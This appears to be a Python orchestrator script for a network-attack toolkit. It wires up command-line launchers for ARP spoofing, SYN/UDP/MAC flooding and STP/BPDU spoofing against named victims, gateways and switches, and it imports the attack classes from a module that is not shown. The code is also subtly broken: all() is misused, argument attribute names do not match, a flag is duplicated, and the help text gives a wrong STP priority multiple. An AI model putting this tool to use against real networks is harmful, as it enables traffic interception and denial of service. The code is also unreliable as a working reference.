#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The orchestrator for all attacks"""


import sys
import argparse
import logging
from textwrap import dedent
from warnings import filterwarnings

filterwarnings("ignore")

from hackme import *  # pylint: disable=W0401,C0413  # noqa: F403,E402


_LOGGER = logging.getLogger(__name__)


def run_arp_spoofing(subparser, args):
    """Run the ARP spoofing attack"""
    arp_spoofer = ARPSpoofer(args.iface, args.mac)  # noqa: F405
    if args.desc:
        print(arp_spoofer.description)
        sys.exit(0)
    if (
        all(
            args.iface,
            args.mac,
            args.gwmac,
            args.gwip,
            args.victmac,
            args.victip,
        )
        is False
    ):
        subparser.print_help()
        sys.exit(1)
    arp_spoofer.add_gateway(args.gw_mac, args.gw_ip)
    arp_spoofer.add_victim(args.victim_mac, args.victim_ip)
    arp_spoofer.run()


def run_flooder(subparser, args):
    """Run SYN, UDP or MAC flood attack"""
    match args.attack:
        case "synflood":
            subargs = [args.destIP, args.port, args.count]
            flooder = SYNFlooder(*subargs)  # noqa: F405
        case "udpflood":
            subargs = [args.destIP, args.port, args.count]
            flooder = UDPFlooder(*subargs)  # noqa: F405
        case "macflood":
            subargs = [args.iface, args.victmac, args.count]
            flooder = MACFlooder(*subargs)  # noqa: F405
        case _:
            raise ValueError(f"Wrong attack name {args.attack}")
    if args.desc:
        print(flooder.description)
        sys.exit(0)
    if all(subargs) is False:
        subparser.print_help()
        sys.exit(1)
    flooder.run()


def run_stpflood(subparser, args):
    """Run BPDU spoof attack"""
    bpdu_packet = BPDUPacket(  # noqa: F405
        args.iface, args.srcmac, args.dstmac, args.priority
    )
    if args.desc:
        print(
            dedent(
                """\
        On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST
        exchange BPDUs to calculate a spanning tree and trim the network
        into a loop-free tree topology. If forged BPDUs are sent to attack a
        device with edge ports and received by them, the device will
        automatically change the edge ports to non-edge ports and recalculate
        the spanning tree. If the bridge priority in the BPDUs sent by an
        attacker is higher than the priority of the root bridge, the network
        topology will change, thereby interrupting service traffic.
        """
            )
        )
        sys.exit(0)
    if all((args.iface, args.srcmac, args.dstmac)) is False:
        subparser.print_help()
        sys.exit(1)
    bpdu_packet.send_multiple_bpdu_packets()


def main():  # pylint: disable=R0915,R0912
    """The orchestration function"""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--debug",
        help="Enable the debug mode",
        action="store_const",
        dest="log_level",
        default=logging.INFO,
        const=logging.DEBUG,
    )
    subparser = parser.add_subparsers(
        dest="attack",
        help="Enter the attack name",
        required=True,
    )

    # The ARP spofing subparser
    parser_arpspoof = subparser.add_parser(
        "arpspoof", help="The ARP spoofing attack"
    )
    parser_arpspoof.add_argument(
        "-i",
        "--iface",
        help="Your network interface (i.e. wlp2s0)",
    )
    parser_arpspoof.add_argument(
        "-m",
        "--mac",
        help="The MAC address of your network interface",
    )
    parser_arpspoof.add_argument(
        "-gm", "--gwmac", help="The gateway's MAC address"
    )
    parser_arpspoof.add_argument(
        "-gip", "--gwip", help="The gateway's IPv4 address"
    )
    parser_arpspoof.add_argument(
        "-vm", "--victmac", help="The victim's MAC address"
    )
    parser_arpspoof.add_argument(
        "-vip", "--victip", help="The victim's IPv4 address"
    )
    parser_arpspoof.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    # The SYN flood subparser
    parser_synflood = subparser.add_parser(
        "synflood", help="The SYN flood attack"
    )
    parser_synflood.add_argument(
        "-d", "--destIP", help="Destination IP address"
    )
    parser_synflood.add_argument(
        "-p", "--port", help="Destination port number"
    )
    parser_synflood.add_argument(
        "-c",
        "--count",
        help="Number of packets. Default 9223372036854775807",
    )
    parser_synflood.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    # The UDP flood subparser
    parser_udpflood = subparser.add_parser(
        "udpflood", help="The UDP flood attack"
    )
    parser_udpflood.add_argument(
        "-d", "--destIP", help="Destination IP address"
    )
    parser_udpflood.add_argument(
        "-p", "--port", help="Destination port number"
    )
    parser_udpflood.add_argument(
        "-c",
        "--count",
        help="Number of packets. Default 9223372036854775807",
    )
    parser_udpflood.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    # The MAC flood subparser
    parser_macflood = subparser.add_parser(
        "macflood", help="The MAC flood attack"
    )
    parser_macflood.add_argument(
        "-i",
        "--iface",
        help="Your network interface (i.e. wlp2s0)",
    )
    parser_macflood.add_argument(
        "-vm",
        "--victmac",
        help="The victim's MAC address",
    )
    parser_macflood.add_argument(
        "-c",
        "--count",
        "-c",
        help="Number of packets. Default 9223372036854775807",
    )
    parser_macflood.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    # The STP spoofing subparser
    parser_stpspoof = subparser.add_parser(
        "stpspoof", help="The STP spoofing attack"
    )
    parser_stpspoof.add_argument(
        "-i", "--iface", help="Your network interface (i.e eth0)"
    )
    parser_stpspoof.add_argument(
        "-smac", "--srcmac", help="Your interface MAC address"
    )
    parser_stpspoof.add_argument(
        "-dmac", "--dstmac", help="Switch interface MAC address"
    )
    parser_stpspoof.add_argument(
        "-p",
        "--priority",
        help="Your STP priority (less is better). Must be a multiple "
        "of 3096. Default 8192",
    )
    parser_stpspoof.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    args = parser.parse_args()

    logging.basicConfig(
        format="%(levelname)s [ %(funcName)s() ] %(message)s",
        level=args.log_level,
    )

    attack_func_mapping = {
        "arpspoof": run_arp_spoofing,
        "synflood": run_flooder,
        "udpflood": run_flooder,
        "macflood": run_flooder,
        "stpspoof": run_stpflood,
    }
    subparsers_map = {
        "arpspoof": parser_arpspoof,
        "synflood": parser_synflood,
        "udpflood": parser_udpflood,
        "macflood": parser_macflood,
        "stpspoof": parser_stpspoof,
    }

    try:
        attack_func_mapping[args.attack](subparsers_map[args.attack], args)
    except Exception as exc:
        _LOGGER.error(str(exc))
        raise exc


if __name__ == "__main__":
    main()
